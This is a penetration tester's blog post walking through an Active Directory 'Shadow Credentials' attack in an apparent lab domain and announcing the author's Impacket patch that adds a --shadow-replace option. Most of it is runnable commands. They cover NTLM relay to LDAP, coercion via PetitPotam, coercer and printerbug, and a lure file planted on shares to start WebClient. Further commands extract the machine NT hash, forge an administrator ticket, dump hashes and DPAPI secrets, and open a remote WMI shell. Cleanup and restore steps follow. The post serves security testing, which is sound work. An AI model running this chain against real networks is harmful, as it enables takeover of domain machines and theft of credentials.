---
title: Shadow Credentials
date: 2026-09-04T04:00:56+01:00
toc: true
images: 
tags:
  - AD
  - English
---

Since late 2023, when I started conducting internal penetration tests, thanks to [Alh4zr3d](https://www.twitch.tv/alh4zr3d/about), "Shadow Credentials" has been my favorite method for gaining administrative privileges on systems on the network. However, I’ve often run into a quirk that got in the way: A computer account can only set its `msDS-KeyCredentialLink` attribute if it’s empty. But if, for example, Windows Hello is already enabled on the system and the attribute is therefore already set, Shadow Credentials via relaying fails. The problem was solved by [my merged Impacket PR](https://github.com/fortra/impacket/pull/2251), which is heavily based on pywhisker. More on that further down below :)

I was actually just going to write a short post, but it ended up being a little longer than I expected. Let's go!

## What Are Shadow Credentials?
A good technical description can be found at [thehacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials). A less technical description would be:
**msDS-KeyCredentialLink** is an attribute of a computer object in Active Directory that enables passwordless authentication. This is used, for example, for authentication via webcam with "Windows Hello". Domain administrators or the computer itself can set or delete this attribute. In a shadow credentials attack, an attacker ensures that the attribute is set in such a way that the attacker can authenticate as an administrator on the computer. The benefits: persistence, lateral movement, and privilege escalation.

## How do I prefer to use shadow credentials?
I like to use shadow credentials with forced authentication and HTTP-to-LDAP relaying to gain administrative access to suitable computers as a regular Active Directory user. Most of the time, due to insufficient tiering, you’ll find login credentials (DPAPI) or other information there that lets you become a domain administrator right away ;). The success rate is high, so it's one of the first checks I perform. But what are the prerequisites for this? Among other things:
1. Any AD user
2. No LDAP signing/channel binding on the DC
3. A computer running the WebClient service

## Procedure
Starting point: Using a password spray (username=password), we gained access to the AD user "hodor". However, this account has no privileges that would help us further. Nevertheless, this account is essential for us for enumeration and forced authentication.

### Enumerate Targets
First, we can check all computers in AD (computers.txt) to see if they are running the WebClient service:
`nxc smb computers.txt -u hodor -p hodor -M webdav`

![markdown](/media/2026/09/shadowcredz1.png)

So we've found a target.

### Get More Targets
If we can't find a computer running the WebClient service, or if the ones we find don't have anything of interest to us, there's a trick we can use to get the WebClient service to start:
We can use the nxc module `drop-sc` to place a `searchConnector-ms` file on writable shares. When a user clicks on this file, the WebClient service is activated on the computer to access the URL specified in the file.
`nxc smb computers.txt -u hodor -p hodor -M drop-sc -o FILENAME=RANSOM_NOTE`

![markdown](/media/2026/09/shadowcredz2.png)

If we wait a little while and get lucky, a user will take an interest in the ransom note on the share and click on it.


Alternatively, we can create such a file (`RANSOM_NOTE.searchConnector-ms`) ourselves:
```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://m10x.de/</url>
    </simpleLocation>
</searchConnectorDescription>
```
(I don't know why)

### Forced Authentication & Relay
So now we have our target: CASTELBLACK.
First, we'll set up the LDAP relay:
`ntlmrelayx.py -t ldap://WINTERFELL.north.sevenkingdoms.local --shadow-credentials --no-validate-privs --pfx-password 'CASTELBLACK' --cert-outfile-path 'CASTELBLACK' --shadow-target 'CASTELBLACK$'`
- `-t ldap://WINTERFELL.north.sevenkingdoms.local` the DC
- `--shadow-target 'CASTELBLACK$'` our target where we want to set the attribute
- `--shadow-credentials` sets the attribute automatically
- `--no-validate-privs` skips unnecessary checks
- `--pfx-password ‘CASTELBLACK’ --cert-outfile-path 'CASTELBLACK'` so it does not generate a filename and password on its own

![markdown](/media/2026/09/shadowcredz3.png)

When an HTTP authentication request is received, ntlmrelayx forwards it to the DC via LDAP and sets the msDS-KeyCredentialLink attribute.

To exploit forced HTTP authentication, we need a DNS record that resolves to our attacker system. Fortunately, AD users are allowed to set DNS records by default:
`python3 /home/kali/tools/krbrelayx/dnstool.py -u 'north.sevenkingdoms.local\hodor' -p 'hodor' -a add -r NB-ATTACKER -d 10.19.10.219 10.19.10.11`
- `-r NB-ATTACKER` DNS-Entry name
- `-a add` add DNS-entry
- `-d 10.19.10.219` Attacker IP
- `10.19.10.11` DC IP

![markdown](/media/2026/09/shadowcredz4.png)

Depending on the situation, you may need to set either the `--legacy` or `--forest` flags, or both, in order to create the LDAP record.

However, there may be issues with the DNS, or regular AD users may be prohibited from setting DNS entries. In that case, we can use Responder, which responds via MDNS, LLMNR, or NBT-NS to the query asking for the IP address of NB-ATTACKER.

`sudo responder -I eth0`

![markdown](/media/2026/09/shadowcredz5.png)

It’s important to note that you should only start `responder` after `ntlmrelayx`, so that `responder` doesn’t already occupy the ports needed by `ntlmrelayx` ;)

Now that we’ve set up the relaying, we still need to deal with forced authentication. We have three different tools to choose from for this (PLEASE LET ME KNOW IF YOU KNOW OF ANY OTHER HTTP AUTH COERCION METHODS THAT COULD BE USED HERE :D):
- coercer: `coercer coerce --always-continue -u 'hodor' -p 'hodor' -d north.sevenkingdoms.local --auth-type http -l NB-ATTACKER -t CASTELBLACK`
- PetitPotam/PetitPotam.py `python3 /home/kali/tools/PetitPotam/PetitPotam.py -u 'hodor' -p 'hodor' -d north.sevenkingdoms.local NB-ATTACKER@80/m10x CASTELBLACK`
- krbrelayx/printerbug.py: `python3 /home/kali/tools/krbrelayx/printerbug.py 'north.sevenkingdoms.local/hodor:hodor'@CASTELBLACK NB-GDATA@80/m10x`

If we're lucky, one of the forced authentication methods will work. Otherwise, we'll just have to pick another target, whether we like it or not...

In our case, though, PetitPotam worked!

![markdown](/media/2026/09/shadowcredz6.png)

Responder shows that it redirected NB-ATTACKER to our IP (as mentioned, this is only necessary if the DNS entry cannot be set or if there are other DNS issues):

![markdown](/media/2026/09/shadowcredz7.png)

And ntlmrelayx successfully carried out the shadow credentials attack:


![markdown](/media/2026/09/shadowcredz8.png)

1. An HTTP authentication request from CASTELBLACK was received and forwarded via LDAP to the DC.
2. A KeyCredential was generated and the attribute was updated. Additionally (thanks to my PR), the system now displays how many KeyCredentials already existed previously. (Since the attack no longer works if there are >=1, and the error message used to be very ambiguous!)
3. The PFX certificate is saved with the name and password we specified.

### Get Computer's NT Hash
First, we will remove the password from the .pfx
`certipy-ad cert -pfx CASTELBLACK.pfx -password 'CASTELBLACK' -export -out 'CASTELBLACK-NOPASS.pfx'`

![markdown](/media/2026/09/shadowcredz9.png)

Then we retrieve the NT Hash of CASTELBLACK$
`certipy-ad auth -pfx 'CASTELBLACK-NOPASS.pfx' -dc-ip 10.19.10.11 -username 'CASTELBLACK$' -domain 'north.sevenkingdoms.local'`

![markdown](/media/2026/09/shadowcredz10.png)

### Get administrator .ccache
Using the NT Hash, we can now issue a ticket for ourselves as an administrator.
`ticketer.py -nthash '66c86c897975e1c873c1abc19670c2e7' -domain-sid 'S-1-5-21-1376439637-918553069-1656847014' -domain 'north.sevenkingdoms.local' -spn 'cifs/CASTELBLACK.north.sevenkingdoms.local' administrator`

![markdown](/media/2026/09/shadowcredz11.png)

And to make things clearer, we're renaming it.
`mv administrator.ccache administrator-CASTELBLACK.ccache`

![markdown](/media/2026/09/shadowcredz12.png)

### Use administrator .ccache
We export it to the KRB5CCNAME environment variable so that tools can use the ticket.
`export KRB5CCNAME=administrator-CASTELBLACK.ccache`

![markdown](/media/2026/09/shadowcredz13.png)

Below, I'll show you 4 tools that I often use afterward (feel free to let me know what your go-to tools are after you've used Shadow Credentials :)):

1. Dumping hashes
`secretsdump.py -k -no-pass administrator@CASTELBLACK.north.sevenkingdoms.local`

![markdown](/media/2026/09/shadowcredz14.png)

2. Gather DPAPI secrets
`dpp collect -t CASTELBLACK.north.sevenkingdoms.local -k --no-pass -u administrator`

![markdown](/media/2026/09/shadowcredz15.png)

3. Obtain a WMI shell (smbexec.py and psexec.py also work using the same syntax)
`wmiexec.py -k -no-pass administrator@CASTELBLACK.north.sevenkingdoms.local`

![markdown](/media/2026/09/shadowcredz16.png)

4. And last but not least, use the best and most versatile penetration testing tool out there
`nxc smb CASTELBLACK --use-kcache`

![markdown](/media/2026/09/shadowcredz17.png)

### Cleanup
Of course, cleaning up is also part of the process. We should remove the attribute we set!
To do this, we can use pywhisker or nxc, for example.

**pywhisker**
`pywhisker --target 'CASTELBLACK$' -d north.sevenkingdoms.local -u 'CASTELBLACK$' -H 66c86c897975e1c873c1abc19670c2e7 --action clear`

![markdown](/media/2026/09/shadowcredz18.png)

**nxc**
1. nxc does not currently offer a "clear" option. Therefore, we first need to find out the device ID:
`nxc ldap WINTERFELL -u CASTELBLACK$ -H 66c86c897975e1c873c1abc19670c2e7 -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=list`

![markdown](/media/2026/09/shadowcredz19.png)

2. Delete the current entry:
`nxc ldap WINTERFELL -u CASTELBLACK$ -H 66c86c897975e1c873c1abc19670c2e7 -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=remove DEVICE_ID=c493fb4c-68f0-f644-8d21-0164a6f2b7ab`

![markdown](/media/2026/09/shadowcredz20.png)

## The problem
It may happen that we attempt the attack but receive an INSUFF_ACCESS_RIGHTS error. The error may seem confusing at first, but my PR now provides additional information: how many KeyCredentials already exist. If the value is greater than 0, the computer account is not allowed to set the attribute to a new value.

![markdown](/media/2026/09/shadowcredz21.png)

However, the computer account is allowed to delete it and then set a new value!

## The solution
The solution to the problem already existed: Pywhisker allows us to back up and delete entries. The only thing missing was porting it to ntlmrelayx so that it would also work in the case of relay attacks. This was implemented through [my merged impacket PR](https://github.com/fortra/impacket/pull/2251):

### How to
Make sure to have the latest impacket version:
`pipx install git+https://github.com/fortra/impacket.git --force`

![markdown](/media/2026/09/shadowcredz22.png)

Now we can use the additional flag --shadow-replace.
`ntlmrelayx.py -t ldap://WINTERFELL.north.sevenkingdoms.local --shadow-credentials --no-validate-privs --pfx-password 'CASTELBLACK' --cert-outfile-path 'CASTELBLACK' --shadow-target 'CASTELBLACK$' --shadow-replace`

![markdown](/media/2026/09/shadowcredz23.png)

![markdown](/media/2026/09/shadowcredz24.png)

ntlmrelayx now detects that an entry already exists and exports it (for later recovery) to CASTELBLACK$-keycredential.json. The entry is then deleted and a new one is created. A computer isn't allowed to edit its entry, but it can delete it and then create a new one ;)

### Restore Previous Entry
However, once we have obtained the computer's NT hash, we should then restore the previous entry.

There are two simple ways to restore the previous entry
#### 1. As Domain Admin
**nxc**
As a domain admin, we can use the `shadow-creds revert` action from nxc.
`nxc ldap WINTERFELL -u robb.stark -p sexywolfy -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=revert JSONFILE=CASTELBLACK\$-keycredential.json`

![markdown](/media/2026/09/shadowcredz25.png)

**pywhisker**
Or we can use pywhisker for the same thing, referred to there as `import`.
`pywhisker --target 'CASTELBLACK$' -d north.sevenkingdoms.local -u 'CASTELBLACK$' -H 66c86c897975e1c873c1abc19670c2e7 --action import -f CASTELBLACK\$-keycredential.json`

![markdown](/media/2026/09/shadowcredz26.png)

#### 2. As Computer Account
As a computer account, we have to take the extra step of deleting the attribute first.

**nxc**
1. nxc does not currently offer a "clear" option. Therefore, we first need to find out the device ID:
`nxc ldap WINTERFELL -u CASTELBLACK$ -H 66c86c897975e1c873c1abc19670c2e7 -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=list`

![markdown](/media/2026/09/shadowcredz19.png)

2. Delete the current entry:
`nxc ldap WINTERFELL -u CASTELBLACK$ -H 66c86c897975e1c873c1abc19670c2e7 -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=remove DEVICE_ID=c493fb4c-68f0-f644-8d21-0164a6f2b7ab`

![markdown](/media/2026/09/shadowcredz20.png)

3. Restore the previous entry:
`nxc ldap WINTERFELL -u CASTELBLACK$ -H 66c86c897975e1c873c1abc19670c2e7 -M shadow-creds -o TARGET=CASTELBLACK$ ACTION=revert JSONFILE=CASTELBLACK\$-keycredential.json`

![markdown](/media/2026/09/shadowcredz27.png)

**pywhisker**
1. Delete the current entry:
`pywhisker --target 'CASTELBLACK$' -d north.sevenkingdoms.local -u 'CASTELBLACK$' -H 66c86c897975e1c873c1abc19670c2e7 --action clear`

![markdown](/media/2026/09/shadowcredz28.png)

2. Restore the previous entry:
`pywhisker --target 'CASTELBLACK$' -d north.sevenkingdoms.local -u 'CASTELBLACK$' -H 66c86c897975e1c873c1abc19670c2e7 --action import -f CASTELBLACK\$-keycredential.json`

![markdown](/media/2026/09/shadowcredz29.png)

## Other New Features
The LDAP Shell has also gained two new features:
- `backup_shadow_creds target [outfile] - Backup shadow credentials from the target (sAMAccountName) into a single JSON file.`
- `restore_shadow_creds target [backupfile] - Restore shadow credentials on the target (sAMAccountName) from a backup JSON file.`

We can use the interactive LDAP shell with the following command:
`ntlmrelayx.py -t ldap://WINTERFELL.north.sevenkingdoms.local --interactive`

![markdown](/media/2026/09/shadowcredz30.png)

When an authentication request is received, the shell becomes available

![markdown](/media/2026/09/shadowcredz31.png)

And we can connect to it using nc to then display all shadow credentials commands

![markdown](/media/2026/09/shadowcredz32.png)

One possible sequence of operations would be as follows:

![markdown](/media/2026/09/shadowcredz33.png)

1. First, an attempt is made to set an entry using `set_shadow_creds CASTELBLACK$`. However, this fails because an entry already exists.
2. The existing entry is backed up using `backup_shadow_creds CASTELBLACK$ backup.json`
3. The entry is then removed using `clear_shadow_creds CASTELBLACK$`
4. A new entry is created using `set_shadow_creds CASTELBLACK$`.
5. ...
6. Profit
7. To restore the entry, first remove the newly created entry using `clear_shadow_creds CASTELBLACK$`.
8. Finally, restore the previous entry using `restore_shadow_creds CASTELBLACK$ backup.json`.

## Outro
Shadow Credentials are cool and powerful. Now that the limitation of not being able to create a new entry when one already exists has been resolved, Shadow Credentials have become even cooler and more powerful.